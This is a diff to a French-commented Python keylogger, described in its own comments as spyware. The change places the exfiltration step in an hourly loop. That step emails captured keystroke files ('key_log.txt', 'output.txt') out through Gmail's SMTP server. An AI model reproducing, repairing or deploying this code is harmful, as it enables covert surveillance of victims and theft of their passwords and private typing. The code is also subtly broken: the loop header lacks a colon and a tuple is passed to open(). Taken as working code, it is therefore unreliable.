@@ -34,35 +34,35 @@ os.system('Logger.pyw')
 
 
 # Fin du spyware
-time.sleep(3600)
-
+while True
+    time.sleep(3600)
 # Envois les données à une email.
-email_user = 'Votre E-mail'
-email_send = 'Votre E-mail'
-email_password = 'Votre Mot de Passe'
-subject = 'Keylogger'
+    email_user = 'Votre E-mail'
+    email_send = 'Votre E-mail'
+    email_password = 'Votre Mot de Passe'
+    subject = 'Keylogger'
 
-msg = MIMEMultipart()
-msg['From'] = email_user
-msg['To'] = email_send
-msg['Subject'] = subject
+    msg = MIMEMultipart()
+    msg['From'] = email_user
+    msg['To'] = email_send
+    msg['Subject'] = subject
 
-body = 'Python Keylogger réponse.'
-msg.attach(MIMEText(body, 'plain'))
+    body = 'Python Keylogger réponse.'
+    msg.attach(MIMEText(body, 'plain'))
 
-filename='key_log.txt', 'output.txt'
-attachment =open(filename, 'rb')
+    filename='key_log.txt', 'output.txt'
+    attachment =open(filename, 'rb')
 
-part = MIMEBase('application', 'octet-stream')
-part.set_payload((attachment).read())
-encoders.encode_base64(part)
-part.add_header('Content-Disposition', "attachment; filename= "+filename)
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', "attachment; filename= "+filename)
 
-msg.attach(part)
-text = msg.as_string()
-server = smtplib.SMTP('smtp.gmail.com', 587)
-server.starttls()
-server.login(email_user, email_password)
+    msg.attach(part)
+    text = msg.as_string()
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email_user, email_password)
 
-server.sendmail(email_user,email_send,text)
-server.quit()
+    server.sendmail(email_user,email_send,text)
+    server.quit()
